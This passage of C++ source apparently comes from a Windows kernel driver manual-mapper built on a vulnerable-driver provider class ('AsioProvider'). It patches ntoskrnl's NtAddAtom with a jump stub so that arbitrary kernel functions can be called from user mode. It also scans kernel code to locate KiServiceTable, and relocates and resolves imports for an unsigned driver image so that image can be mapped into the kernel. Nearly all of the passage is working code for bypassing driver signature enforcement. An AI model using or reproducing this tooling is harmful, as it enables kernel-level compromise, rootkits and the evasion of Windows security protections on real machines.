        if (!CallKernelFunction(&allocated, kernelExAllocatePoolWithTag_, nonPagedPool, size, poolTag)) {
            return 0;
        }

        return allocated;
    }

    bool FreePool(uint64_t address) {
        if (!address || !ntoskrnlBase_) {
            return false;
        }

        if (!kernelExFreePool_) {
            kernelExFreePool_ = GetKernelModuleExport(ntoskrnlBase_, "ExFreePool");
        }
        if (!kernelExFreePool_) {
            std::wcerr << L"[-] Failed to resolve ExFreePool" << std::endl;
            return false;
        }

        return CallKernelFunction<void>(nullptr, kernelExFreePool_, address);
    }

    template <typename T, typename... Args>
    bool CallKernelFunction(T* outResult, uint64_t kernelFunctionAddress, Args... args) {
        constexpr bool callVoid = std::is_same_v<T, void>;
        static_assert(sizeof...(Args) <= 4, "CallKernelFunction supports up to four arguments");

        if constexpr (!callVoid) {
            if (!outResult) {
                return false;
            }
        } else {
            UNREFERENCED_PARAMETER(outResult);
        }

        if (!kernelFunctionAddress || !ntoskrnlBase_) {
            return false;
        }
        if (kernelFunctionAddress < 0x0000800000000000ull) {
            std::wcerr << L"[-] Refusing to execute user-mode VA from kernel context: 0x"
                       << std::hex << kernelFunctionAddress << std::dec << std::endl;
            return false;
        }

        HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
        if (!ntdll) {
            std::wcerr << L"[-] ntdll.dll is not loaded" << std::endl;
            return false;
        }

        void* userNtAddAtom = reinterpret_cast<void*>(GetProcAddress(ntdll, "NtAddAtom"));
        if (!userNtAddAtom) {
            std::wcerr << L"[-] Failed to resolve user ntdll!NtAddAtom" << std::endl;
            return false;
        }

        if (!kernelNtAddAtom_) {
            kernelNtAddAtom_ = ResolveNtAddAtomSyscallTarget();
        }
        if (!kernelNtAddAtom_) {
            std::wcerr << L"[-] Failed to resolve kernel NtAddAtom syscall target" << std::endl;
            return false;
        }

        uint8_t jump[] = {
            0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0,
            0xFF, 0xE0
        };
        std::memcpy(&jump[2], &kernelFunctionAddress, sizeof(kernelFunctionAddress));

        uint8_t original[sizeof(jump)]{};
        if (!ReadKernelMemory(kernelNtAddAtom_, original, sizeof(original))) {
            return false;
        }

        if (original[0] == jump[0] && original[1] == jump[1] &&
            original[sizeof(jump) - 2] == jump[sizeof(jump) - 2] &&
            original[sizeof(jump) - 1] == jump[sizeof(jump) - 1]) {
            std::wcerr << L"[-] ntoskrnl!NtAddAtom already appears to be hooked" << std::endl;
            return false;
        }

        if (!WriteToReadOnlyMemory(kernelNtAddAtom_, jump, sizeof(jump))) {
            return false;
        }

        if constexpr (!callVoid) {
            using Fn = T(__stdcall*)(Args...);
            *outResult = reinterpret_cast<Fn>(userNtAddAtom)(args...);
        } else {
            using Fn = void(__stdcall*)(Args...);
            reinterpret_cast<Fn>(userNtAddAtom)(args...);
        }

        return WriteToReadOnlyMemory(kernelNtAddAtom_, original, sizeof(original));
    }

    // Resolve the in-kernel address that the NtAddAtom syscall ACTUALLY dispatches
    // to. On modern Windows 11 (24H2/25H2/26200) `ntoskrnl!NtAddAtom` is a small
    // pageable wrapper that hardcodes PreviousMode=KernelMode and tail-calls the
    // real implementation, while the syscall path enters the implementation via
    // KeServiceDescriptorTable. Patching the export does not intercept syscalls.
    //
    // Strategy (in order):
    //   M2  - Walk KiSystemCall64 in kernel memory, locate KiServiceTable, read
    //         SSDT[0x47] and decode (multiple encodings).
    //   M1  - Read the export's prologue. If it's the new wrapper, follow the
    //         call rel32 to the inner implementation.
    //   M0  - Legacy: assume export IS the syscall handler.
    uint64_t ResolveNtAddAtomSyscallTarget() {
        constexpr ULONG kNtAddAtomSyscallIndex = 0x47;
        const uint64_t exportAddr = GetKernelModuleExport(ntoskrnlBase_, "NtAddAtom");
        if (!exportAddr) {
            std::wcerr << L"[-] Failed to resolve kernel ntoskrnl!NtAddAtom export" << std::endl;
            return 0;
        }
        std::wcout << L"[+] ntoskrnl!NtAddAtom export @ 0x" << std::hex << exportAddr
                   << std::dec << std::endl;

        // --- M2: SSDT walk ---
        uint64_t kiServiceTable = FindKiServiceTable();
        if (kiServiceTable) {
            std::wcout << L"[+] KiServiceTable @ 0x" << std::hex << kiServiceTable
                       << std::dec << std::endl;
            uint32_t entry = 0;
            if (ReadKernelMemory(kiServiceTable + kNtAddAtomSyscallIndex * 4, &entry, sizeof(entry))) {
                const int32_t signedEntry = static_cast<int32_t>(entry);
                const int32_t offset = signedEntry >> 4;
                const int argwords = signedEntry & 0xF;
                std::wcout << L"[+] SSDT[0x47] raw = 0x" << std::hex << entry
                           << L"  offset = " << std::dec << offset
                           << L"  argwords = " << argwords << std::endl;
                uint64_t candidate = kiServiceTable + offset;
                if (IsPlausibleKernelCode(candidate)) {
                    std::wcout << L"[+] M2 SSDT decode -> 0x" << std::hex << candidate
                               << std::dec << std::endl;
                    return candidate;
                }
                std::wcerr << L"[!] SSDT[0x47] entry did not decode to plausible code; "
                              L"falling through to M1" << std::endl;
            }
        } else {
            std::wcerr << L"[!] Could not locate KiServiceTable; falling through to M1" << std::endl;
        }

        // --- M1: read export prologue, follow wrapper's call rel32 ---
        uint8_t prologue[12]{};
        if (ReadKernelMemory(exportAddr, prologue, sizeof(prologue))) {
            // sub rsp,28 / xor r9d,r9d / call rel32  =  48 83 EC 28 45 33 C9 E8 ?? ?? ?? ??
            if (prologue[0] == 0x48 && prologue[1] == 0x83 && prologue[2] == 0xEC &&
                prologue[3] == 0x28 && prologue[4] == 0x45 && prologue[5] == 0x33 &&
                prologue[6] == 0xC9 && prologue[7] == 0xE8) {
                int32_t rel = 0;
                std::memcpy(&rel, &prologue[8], 4);
                uint64_t inner = exportAddr + 12 + rel;
                std::wcout << L"[+] M1 wrapper trace -> 0x" << std::hex << inner
                           << std::dec << std::endl;
                return inner;
            }
        }

        // --- M0: legacy, assume export is the handler ---
        std::wcout << L"[+] M0 legacy: using export address directly" << std::endl;
        return exportAddr;
    }

    // Live KiServiceTable resolution.
    //
    // Strategy: scan ntoskrnl's .text for the SAR sentinel
    //   49 C1 FB 04   sar r11, 4        (modern x64)
    //   41 C1 FB 04   sar r11d, 4       (older variant)
    // which is essentially unique to the SSDT entry-decode block. From each
    // sentinel walk backward up to 0x100 bytes for the closest
    //   4C 8D 15 dd dd dd dd  lea r10, [rip + disp32]
    // The LEA target is either KiServiceTable itself, or KeServiceDescriptorTable
    // (a 32-byte struct whose first 8 bytes hold a pointer to KiServiceTable).
    // The dispatcher dereferences the descriptor via
    //   4D 8B 12       mov r10, [r10]
    // (or `4C 8B 1F` for r11 etc.) between the LEA and the SAR. We detect
    // this MOV in the same window; if present, dereference one level through
    // kernel memory to obtain the live KiServiceTable address.
    //
    // Final validation: sample 128 SSDT entries, decode each with
    //   handler = base + sign_extend(entry >> 4)
    // and require >50% to land in an executable section of ntoskrnl.
    uint64_t FindKiServiceTable() {
        if (kiServiceTable_) {
            return kiServiceTable_;
        }
        if (!ntoskrnlBase_) {
            return 0;
        }

        // PE headers / .text bounds from live kernel memory.
        IMAGE_DOS_HEADER dos{};
        if (!ReadKernelMemory(ntoskrnlBase_, &dos, sizeof(dos)) ||
            dos.e_magic != IMAGE_DOS_SIGNATURE) {
            return 0;
        }
        IMAGE_NT_HEADERS64 nt{};
        if (!ReadKernelMemory(ntoskrnlBase_ + dos.e_lfanew, &nt, sizeof(nt)) ||
            nt.Signature != IMAGE_NT_SIGNATURE) {
            return 0;
        }
        const uint32_t imageSize = nt.OptionalHeader.SizeOfImage;

        // Mirror every executable section into local buffers so we can scan
        // and back-walk byte streams without per-byte kernel reads. Also
        // record the union range [imgLo, imgHi) for validation.
        struct Mirror {
            uint64_t va = 0;
            uint32_t size = 0;
            std::vector<uint8_t> bytes;
            bool isCode = false;
        };
        std::vector<Mirror> mirrors;
        uint64_t imgLo = ntoskrnlBase_;
        uint64_t imgHi = ntoskrnlBase_ + imageSize;
        Mirror* textMirror = nullptr;

        for (WORD i = 0; i < nt.FileHeader.NumberOfSections; ++i) {
            IMAGE_SECTION_HEADER sec{};
            const uint64_t secAddr = ntoskrnlBase_ + dos.e_lfanew + sizeof(nt) +
                                     i * sizeof(IMAGE_SECTION_HEADER);
            if (!ReadKernelMemory(secAddr, &sec, sizeof(sec))) {
                return 0;
            }
            const bool exec = (sec.Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
            if (!exec) {
                continue;
            }
            Mirror m;
            m.va = ntoskrnlBase_ + sec.VirtualAddress;
            m.size = sec.Misc.VirtualSize ? sec.Misc.VirtualSize : sec.SizeOfRawData;
            m.isCode = true;
            if (m.size == 0 || m.size > imageSize) {
                continue;
            }
            m.bytes.resize(m.size);
            if (!ReadKernelMemory(m.va, m.bytes.data(), m.size)) {
                std::wcerr << L"[-] failed to mirror section "
                           << std::string(reinterpret_cast<const char*>(sec.Name), 8).c_str()
                           << std::endl;
                continue;
            }
            if (std::memcmp(sec.Name, ".text", 5) == 0) {
                textMirror = nullptr; // assigned after push_back
            }
            mirrors.push_back(std::move(m));
            if (std::memcmp(sec.Name, ".text", 5) == 0) {
                textMirror = &mirrors.back();
            }
        }
        if (mirrors.empty() || !textMirror) {
            return 0;
        }

        // Helper: given a kernel VA, is it inside any executable section?
        auto inExec = [&](uint64_t va) -> bool {
            for (const auto& m : mirrors) {
                if (m.isCode && va >= m.va && va < m.va + m.size) {
                    return true;
                }
            }
            return false;
        };

        // Helper: read 4 bytes from any mirrored section. Returns false if VA
        // isn't covered.
        auto read4 = [&](uint64_t va, uint32_t& out) -> bool {
            for (const auto& m : mirrors) {
                if (va >= m.va && va + 4 <= m.va + m.size) {
                    std::memcpy(&out, m.bytes.data() + (va - m.va), 4);
                    return true;
                }
            }
            return false;
        };

        // Collect every SAR sentinel hit in every executable section.
        const uint8_t sar64[] = { 0x49, 0xC1, 0xFB, 0x04 }; // sar r11, 4
        const uint8_t sar32[] = { 0x41, 0xC1, 0xFB, 0x04 }; // sar r11d, 4

        std::vector<uint64_t> sentinelHits;
        for (const auto& m : mirrors) {
            for (size_t off = 0; off + 4 <= m.bytes.size(); ++off) {
                if ((std::memcmp(&m.bytes[off], sar64, 4) == 0) ||
                    (std::memcmp(&m.bytes[off], sar32, 4) == 0)) {
                    sentinelHits.push_back(m.va + off);
                }
            }
        }
        std::wcout << L"[+] SAR sentinel hits: " << sentinelHits.size() << std::endl;

        // For each sentinel hit, walk backward up to 0x100 bytes looking for a
        // `lea r10, [rip+disp32]`. The closest one is our table-load. Also
        // check whether a `mov r10, [r10]` (4D 8B 12) appears between the LEA
        // and the SAR — that indicates the LEA points at KeServiceDescriptorTable
        // (a descriptor struct) rather than at KiServiceTable directly.
        constexpr uint8_t LEA_R10_PREFIX[] = { 0x4C, 0x8D, 0x15 };
        constexpr uint8_t MOV_R10_DEREF[]  = { 0x4D, 0x8B, 0x12 };

        for (uint64_t sar : sentinelHits) {
            // Locate the mirror containing this SAR.
            const Mirror* mh = nullptr;
            for (const auto& m : mirrors) {
                if (sar >= m.va && sar < m.va + m.size) {
                    mh = &m;
                    break;
                }
            }
            if (!mh) continue;
            const size_t sarOff = static_cast<size_t>(sar - mh->va);

            const size_t windowStart = (sarOff > 0x100) ? (sarOff - 0x100) : 0;
            // Find the LATEST lea r10 strictly before the SAR.
            ptrdiff_t leaOff = -1;
            for (ptrdiff_t i = static_cast<ptrdiff_t>(sarOff) - 7; i >= static_cast<ptrdiff_t>(windowStart); --i) {
                if (std::memcmp(&mh->bytes[i], LEA_R10_PREFIX, 3) == 0) {
                    leaOff = i;
                    break;
                }
            }
            if (leaOff < 0) continue;

            int32_t disp = 0;
            std::memcpy(&disp, &mh->bytes[leaOff + 3], 4);
            const uint64_t leaInstrEnd = mh->va + leaOff + 7;
            uint64_t target = leaInstrEnd + disp;
            if (target < imgLo || target >= imgHi) continue;

            // Detect dereference: scan between LEA and SAR for `4D 8B 12`
            // (mov r10, [r10]). Loosely also accept `4C 8B 12`.
            bool deref = false;
            for (size_t i = static_cast<size_t>(leaOff) + 7; i + 3 <= sarOff; ++i) {
                if (std::memcmp(&mh->bytes[i], MOV_R10_DEREF, 3) == 0) {
                    deref = true;
                    break;
                }
                // Also handle 4C 8B 12 = mov r10, [rdx] (some compilers shuffle)
                // We don't accept that as deref since it changes r10 base.
            }

            uint64_t kst = target;
            if (deref) {
                uint64_t base = 0;
                if (!ReadKernelMemory(target, &base, sizeof(base))) continue;
                if (base < imgLo || base >= imgHi) continue;
                kst = base;
                std::wcout << L"[+] LEA r10 @ 0x" << std::hex << (mh->va + leaOff)
                           << L" -> KeServiceDescriptorTable @ 0x" << target
                           << L" -> KiServiceTable @ 0x" << kst
                           << L" (via " << std::dec << "mov r10, [r10])"
                           << std::endl;
            } else {
                std::wcout << L"[+] LEA r10 @ 0x" << std::hex << (mh->va + leaOff)
                           << L" -> direct KiServiceTable @ 0x" << kst
                           << std::dec << std::endl;
            }

            // We don't know upfront whether the LEA loaded KiServiceTable or
            // KeServiceDescriptorTable. Try both: validate the LEA target as
            // a table directly, AND validate after dereferencing its first
            // 8 bytes as a Base pointer (KSERVICE_TABLE_DESCRIPTOR layout).
            //
            // Descriptor layout (ReactOS / public Win11 23H2 dumps confirm):
            //   +0x00 Base    PULONG_PTR  -> KiServiceTable
            //   +0x08 Count   PULONG       (zero on x64)
            //   +0x10 Limit   ULONG_PTR    (number of services, ~0x1d9..0x1e9 on Win11)
            //   +0x18 Number  PUCHAR       -> KiArgumentTable
            //
            // Strong signature: Base in image, Limit in [0x100, 0x1000],
            // Limit*4 in image, Number in image, Number close to Base+Limit*4.
            uint64_t altKst = 0;
            {
                uint64_t descBase   = 0;
                uint64_t descLimit  = 0;
                uint64_t descNumber = 0;
                if (ReadKernelMemory(target + 0x00, &descBase,   sizeof(descBase))   &&
                    ReadKernelMemory(target + 0x10, &descLimit,  sizeof(descLimit))  &&
                    ReadKernelMemory(target + 0x18, &descNumber, sizeof(descNumber))) {

                    const bool baseOk   = descBase   >= imgLo && descBase   < imgHi
                                          && (descBase & 0x3) == 0;          // DWORD aligned
                    const bool limitOk  = descLimit >= 0x100 && descLimit <= 0x1000
                                          && descBase + descLimit * 4 < imgHi;
                    const bool numberOk = descNumber >= imgLo && descNumber < imgHi;
                    int64_t expected = static_cast<int64_t>(descBase + descLimit * 4);
                    int64_t actual   = static_cast<int64_t>(descNumber);
                    int64_t skew     = actual - expected;
                    const bool layoutOk = numberOk && skew >= -0x40 && skew <= 0x40;

                    if (baseOk && limitOk && layoutOk) {
                        altKst = descBase;
                        std::wcout << L"    [+] descriptor signature matches: "
                                   << L"Base=0x" << std::hex << descBase
                                   << L"  Limit=" << std::dec << descLimit
                                   << L"  Number=0x" << std::hex << descNumber
                                   << L"  skew=" << std::dec << skew << std::endl;
                    } else {
                        std::wcout << L"    [-] descriptor checks: baseOk=" << baseOk
                                   << L" limitOk=" << limitOk
                                   << L" layoutOk=" << layoutOk
                                   << L"  (Base=0x" << std::hex << descBase
                                   << L" Limit=" << std::dec << descLimit
                                   << L" Number=0x" << std::hex << descNumber
                                   << std::dec << L")" << std::endl;
                    }
                }
            }

            auto validate = [&](uint64_t base, const wchar_t* tag) -> bool {
                int hits = 0;
                int nonZero = 0;
                int inImage = 0;
                uint32_t firstEntries[8]{};
                for (int j = 0; j < 128; ++j) {
                    uint32_t entryU;
                    if (!ReadKernelMemory(base + j * 4, &entryU, sizeof(entryU))) {
                        break;
                    }
                    if (j < 8) firstEntries[j] = entryU;
                    if (entryU == 0 || entryU == 0xFFFFFFFFu) continue;
                    ++nonZero;
                    int32_t entry = static_cast<int32_t>(entryU);
                    uint64_t handler = base + (entry >> 4);
                    if (handler >= imgLo && handler < imgHi) ++inImage;
                    if (inExec(handler)) ++hits;
                }
                std::wcout << L"    [" << tag << L"] base=0x" << std::hex << base
                           << L"  hits=" << std::dec << hits
                           << L"  in_image=" << inImage
                           << L"  nonZero=" << nonZero << std::endl;
                std::wcout << L"      SSDT[0..7] raw = ";
                for (int j = 0; j < 8; ++j) {
                    std::wcout << std::hex << firstEntries[j] << L" " << std::dec;
                }
                std::wcout << std::endl;
                // We require BOTH a clear majority in-image (>=80%) AND
                // a healthy ratio in executable sections (>=50% of nonZero).
                // The latter rules out random data arrays that happen to point
                // back into the image, while staying permissive enough to
                // tolerate the few legitimate non-EXECUTE landing pads.
                return nonZero >= 80 &&
                       inImage * 5 >= nonZero * 4 &&
                       hits * 2 >= nonZero;
            };

            // Try the candidate that smells like a descriptor first (cleaner).
            if (altKst && validate(altKst, L"deref")) {
                kiServiceTable_ = altKst;
                return altKst;
            }
            if (validate(kst, L"direct")) {
                kiServiceTable_ = kst;
                return kst;
            }
        }
        return 0;
    }

    bool IsPlausibleKernelCode(uint64_t va) {
        if (!ntoskrnlBase_ || va < ntoskrnlBase_) {
            return false;
        }
        uint8_t b[8]{};
        if (!ReadKernelMemory(va, b, sizeof(b))) {
            return false;
        }
        // Reject obvious non-code patterns.
        if (b[0] == 0xCC || (b[0] == 0x00 && b[1] == 0x00 && b[2] == 0x00 && b[3] == 0x00)) {
            return false;
        }
        return true;
    }

private:
    HANDLE device_ = nullptr;
    uint64_t pml4_ = 0;
    uint64_t lowStubAnchor_ = 0;
    uint64_t ntoskrnlBase_ = 0;
    uint64_t kernelNtAddAtom_ = 0;
    uint64_t kernelExAllocatePoolWithTag_ = 0;
    uint64_t kernelExFreePool_ = 0;
    uint64_t kiServiceTable_ = 0;
};

static uint64_t GetKernelModuleAddress(const std::string& moduleName) {
    // First try Win32's documented EnumDeviceDrivers. It does NOT require
    // SeDebugPrivilege and works for non-elevated Administrators where
    // NtQuerySystemInformation(SystemModuleInformation) returns access denied.
    {
        std::vector<LPVOID> drivers(1024);
        DWORD needed = 0;
        if (EnumDeviceDrivers(drivers.data(),
                              static_cast<DWORD>(drivers.size() * sizeof(LPVOID)),
                              &needed)) {
            const DWORD count = std::min<DWORD>(
                static_cast<DWORD>(drivers.size()),
                needed / static_cast<DWORD>(sizeof(LPVOID)));
            if (moduleName.empty() && count > 0) {
                return reinterpret_cast<uint64_t>(drivers[0]);
            }
            char nameBuf[MAX_PATH];
            for (DWORD i = 0; i < count; ++i) {
                if (!GetDeviceDriverBaseNameA(drivers[i], nameBuf, MAX_PATH)) {
                    continue;
                }
                if (_stricmp(nameBuf, moduleName.c_str()) == 0) {
                    return reinterpret_cast<uint64_t>(drivers[i]);
                }
            }
        }
    }

    // Legacy fall-through: privileged NtQuerySystemInformation path.
    auto query = NtQuerySystemInformationPtr();
    if (!query) {
        std::wcerr << L"[-] Failed to resolve NtQuerySystemInformation" << std::endl;
        return 0;
    }

    ULONG size = 0;
    NTSTATUS status = query(11, nullptr, 0, &size);
    if (size == 0) {
        size = 0x10000;
    }

    std::vector<uint8_t> buffer(size);
    while ((status = query(11, buffer.data(), static_cast<ULONG>(buffer.size()), &size)) == STATUS_INFO_LENGTH_MISMATCH) {
        buffer.resize(size + 0x1000);
    }

    if (!NT_SUCCESS(status)) {
        std::wcerr << L"[-] NtQuerySystemInformation(SystemModuleInformation) failed: 0x"
                   << std::hex << status << std::dec << std::endl;
        return 0;
    }

    const auto* modules = reinterpret_cast<const RtlProcessModules*>(buffer.data());
    if (!modules || modules->NumberOfModules == 0) {
        return 0;
    }

    if (moduleName.empty()) {
        return reinterpret_cast<uint64_t>(modules->Modules[0].ImageBase);
    }

    for (ULONG i = 0; i < modules->NumberOfModules; ++i) {
        const auto& module = modules->Modules[i];
        const char* name = reinterpret_cast<const char*>(module.FullPathName) + module.OffsetToFileName;
        if (_stricmp(name, moduleName.c_str()) == 0) {
            return reinterpret_cast<uint64_t>(module.ImageBase);
        }
    }

    return 0;
}

static uint64_t ResolveKernelBaseFromAnchor(AsioProvider& kernel, uint64_t anchor) {
    if (!anchor) {
        return 0;
    }

    constexpr uint64_t kScanWindow = 0x2000000ull;
    uint64_t start = anchor > kScanWindow ? (anchor - kScanWindow) : 0;
    start &= ~0xFFFull;

    for (uint64_t current = anchor & ~0xFFFull; current >= start; current -= 0x1000) {
        IMAGE_DOS_HEADER dos{};
        if (!kernel.ReadKernelMemory(current, &dos, sizeof(dos)) || dos.e_magic != IMAGE_DOS_SIGNATURE) {
            if (current == 0) break;
            continue;
        }

        IMAGE_NT_HEADERS64 nt{};
        if (!kernel.ReadKernelMemory(current + dos.e_lfanew, &nt, sizeof(nt)) || nt.Signature != IMAGE_NT_SIGNATURE) {
            if (current == 0) break;
            continue;
        }
        if (nt.OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
            if (current == 0) break;
            continue;
        }
        if (!nt.OptionalHeader.SizeOfImage || nt.OptionalHeader.SizeOfImage > 0x8000000) {
            if (current == 0) break;
            continue;
        }
        const auto& exportDir = nt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
        if (!exportDir.VirtualAddress || !exportDir.Size || exportDir.Size > (1u << 20)) {
            if (current == 0) break;
            continue;
        }

        const uint64_t psLookup = kernel.GetKernelModuleExport(current, "PsLookupProcessByProcessId");
        const uint64_t psSectionBase = kernel.GetKernelModuleExport(current, "PsGetProcessSectionBaseAddress");
        if (psLookup && psSectionBase) {
            return current;
        }

        if (current == 0) break;
    }

    return 0;
}

static PIMAGE_NT_HEADERS64 GetNtHeaders(void* imageBase) {
    auto* dos = reinterpret_cast<PIMAGE_DOS_HEADER>(imageBase);
    if (!dos || dos->e_magic != IMAGE_DOS_SIGNATURE) {
        return nullptr;
    }

    auto* nt = reinterpret_cast<PIMAGE_NT_HEADERS64>(reinterpret_cast<uintptr_t>(imageBase) + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        return nullptr;
    }

    return nt;
}

static std::vector<RelocInfo> GetRelocs(void* imageBase) {
    PIMAGE_NT_HEADERS64 nt = GetNtHeaders(imageBase);
    if (!nt) {
        return {};
    }

    const DWORD relocRva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
    const DWORD relocSize = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
    if (!relocRva || !relocSize) {
        return {};
    }

    std::vector<RelocInfo> relocs;
    auto* current = reinterpret_cast<PIMAGE_BASE_RELOCATION>(reinterpret_cast<uintptr_t>(imageBase) + relocRva);
    const auto* end = reinterpret_cast<PIMAGE_BASE_RELOCATION>(reinterpret_cast<uintptr_t>(current) + relocSize);

    while (current < end && current->SizeOfBlock) {
        RelocInfo info{};
        info.Address = reinterpret_cast<uintptr_t>(imageBase) + current->VirtualAddress;
        info.Item = reinterpret_cast<USHORT*>(reinterpret_cast<uintptr_t>(current) + sizeof(IMAGE_BASE_RELOCATION));
        info.Count = (current->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
        relocs.push_back(info);
        current = reinterpret_cast<PIMAGE_BASE_RELOCATION>(reinterpret_cast<uintptr_t>(current) + current->SizeOfBlock);
    }

    return relocs;
}

static std::vector<ImportInfo> GetImports(void* imageBase) {
    PIMAGE_NT_HEADERS64 nt = GetNtHeaders(imageBase);
    if (!nt) {
        return {};
    }

    const DWORD importRva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    if (!importRva) {
        return {};
    }

    std::vector<ImportInfo> imports;
    auto* descriptor = reinterpret_cast<PIMAGE_IMPORT_DESCRIPTOR>(reinterpret_cast<uintptr_t>(imageBase) + importRva);
    while (descriptor->FirstThunk) {
        ImportInfo info{};
        info.ModuleName = reinterpret_cast<char*>(reinterpret_cast<uintptr_t>(imageBase) + descriptor->Name);

        const DWORD originalThunkRva = descriptor->OriginalFirstThunk ? descriptor->OriginalFirstThunk : descriptor->FirstThunk;
        auto* thunk = reinterpret_cast<PIMAGE_THUNK_DATA64>(reinterpret_cast<uintptr_t>(imageBase) + descriptor->FirstThunk);
        auto* originalThunk = reinterpret_cast<PIMAGE_THUNK_DATA64>(reinterpret_cast<uintptr_t>(imageBase) + originalThunkRva);

        while (originalThunk->u1.AddressOfData) {
            ImportFunctionInfo function{};
            function.Address = &thunk->u1.Function;

            if (IMAGE_SNAP_BY_ORDINAL64(originalThunk->u1.Ordinal)) {
                function.ByOrdinal = true;
                function.Ordinal = static_cast<WORD>(IMAGE_ORDINAL64(originalThunk->u1.Ordinal));
            } else {
                auto* importByName = reinterpret_cast<PIMAGE_IMPORT_BY_NAME>(
                    reinterpret_cast<uintptr_t>(imageBase) + originalThunk->u1.AddressOfData);
                function.Name = reinterpret_cast<const char*>(importByName->Name);
            }

            info.Functions.push_back(function);
            ++thunk;
            ++originalThunk;
        }

        imports.push_back(std::move(info));
        ++descriptor;
    }

    return imports;
}

static void RelocateImageByDelta(const std::vector<RelocInfo>& relocs, uint64_t delta) {
    for (const auto& reloc : relocs) {
        for (ULONG i = 0; i < reloc.Count; ++i) {
            const uint16_t type = reloc.Item[i] >> 12;
            const uint16_t offset = reloc.Item[i] & 0xFFF;
            if (type == IMAGE_REL_BASED_DIR64) {
                *reinterpret_cast<uint64_t*>(reloc.Address + offset) += delta;
            }
        }
    }
}

static bool FixSecurityCookie(void* localImage, uint64_t kernelImageBase) {
    PIMAGE_NT_HEADERS64 nt = GetNtHeaders(localImage);
    if (!nt) {
        return false;
    }

    const DWORD loadConfigRva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG].VirtualAddress;
    if (!loadConfigRva) {
        std::wcout << L"[+] Load config not present; security cookie fix skipped" << std::endl;
        return true;
    }

    auto* loadConfig = reinterpret_cast<PIMAGE_LOAD_CONFIG_DIRECTORY64>(reinterpret_cast<uintptr_t>(localImage) + loadConfigRva);
    if (!loadConfig->SecurityCookie) {
        std::wcout << L"[+] Security cookie not present; fix skipped" << std::endl;
        return true;
    }

    const uint64_t localCookie = loadConfig->SecurityCookie - kernelImageBase + reinterpret_cast<uintptr_t>(localImage);
    auto* cookiePtr = reinterpret_cast<uint64_t*>(localCookie);
    constexpr uint64_t defaultCookie = 0x2B992DDFA232ull;
    if (*cookiePtr != defaultCookie) {
        std::wcerr << L"[-] Security cookie has an unexpected value" << std::endl;
        return false;
    }

    uint64_t cookie = defaultCookie ^ GetCurrentProcessId() ^ GetCurrentThreadId();
    if (cookie == defaultCookie) {
        cookie ^= 0x1234;
    }

    *cookiePtr = cookie;
    return true;
}

static bool ResolveImports(AsioProvider& kernel, void* localImage) {
    const auto imports = GetImports(localImage);
    for (const auto& import : imports) {
        uint64_t moduleBase = GetKernelModuleAddress(import.ModuleName);
        if (!moduleBase && _stricmp(import.ModuleName.c_str(), "ntoskrnl.exe") == 0) {
            moduleBase = kernel.NtoskrnlBase();
        }
        if (!moduleBase) {
            std::cerr << "[-] Dependency not loaded: " << import.ModuleName << std::endl;
            return false;
        }

        for (const auto& function : import.Functions) {
            if (function.ByOrdinal) {
                std::cerr << "[-] Ordinal import is not supported: " << import.ModuleName
                          << " ordinal " << function.Ordinal << std::endl;
                return false;
            }

            uint64_t functionAddress = kernel.GetKernelModuleExport(moduleBase, function.Name);
            if (!functionAddress && moduleBase != kernel.NtoskrnlBase()) {
                functionAddress = kernel.GetKernelModuleExport(kernel.NtoskrnlBase(), function.Name);
            }
            if (!functionAddress) {
                std::cerr << "[-] Failed to resolve import " << function.Name
                          << " from " << import.ModuleName << std::endl;
                return false;
            }

            *function.Address = functionAddress;
        }
    }

    return true;
}

// Resolve a named export to its RVA inside a parsed PE file (raw bytes on disk
// form, before manual mapping). Used to locate post-DllMain entry points in
// the kernel-mapped image without having to re-parse kernel memory.
static DWORD GetExportRvaByName(const std::vector<uint8_t>& rawImage, const std::string& name) {
    if (rawImage.size() < sizeof(IMAGE_DOS_HEADER)) {
        return 0;
    }
    auto* rawBase = const_cast<uint8_t*>(rawImage.data());
    PIMAGE_NT_HEADERS64 nt = GetNtHeaders(rawBase);
    if (!nt) {
        return 0;
    }
    const auto& dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!dir.VirtualAddress || !dir.Size) {
        return 0;
    }

    // The export directory lives at file-VA == file-RVA in a raw image, so we
    // walk sections to translate RVAs to file offsets.
    auto rvaToFileOffset = [&](DWORD rva) -> uint32_t {
        auto* section = IMAGE_FIRST_SECTION(nt);
        for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
            const DWORD va = section[i].VirtualAddress;
            const DWORD vsize = section[i].Misc.VirtualSize ? section[i].Misc.VirtualSize : section[i].SizeOfRawData;
            if (rva >= va && rva < va + vsize) {
                const uint32_t delta = rva - va;
                if (delta >= section[i].SizeOfRawData) {
                    return 0;
                }
                return section[i].PointerToRawData + delta;
            }
        }
        return 0;
    };

    const uint32_t expFileOff = rvaToFileOffset(dir.VirtualAddress);
    if (!expFileOff || expFileOff + sizeof(IMAGE_EXPORT_DIRECTORY) > rawImage.size()) {
        return 0;
    }
    auto* exp = reinterpret_cast<const IMAGE_EXPORT_DIRECTORY*>(rawImage.data() + expFileOff);

    const uint32_t namesOff = rvaToFileOffset(exp->AddressOfNames);
    const uint32_t ordsOff  = rvaToFileOffset(exp->AddressOfNameOrdinals);
    const uint32_t funcsOff = rvaToFileOffset(exp->AddressOfFunctions);
    if (!namesOff || !ordsOff || !funcsOff) {
        return 0;
    }

    auto* names = reinterpret_cast<const DWORD*>(rawImage.data() + namesOff);
    auto* ords  = reinterpret_cast<const WORD*>(rawImage.data() + ordsOff);
    auto* funcs = reinterpret_cast<const DWORD*>(rawImage.data() + funcsOff);

    for (DWORD i = 0; i < exp->NumberOfNames; ++i) {
        const uint32_t nameOff = rvaToFileOffset(names[i]);
        if (!nameOff || nameOff >= rawImage.size()) {
            continue;
        }
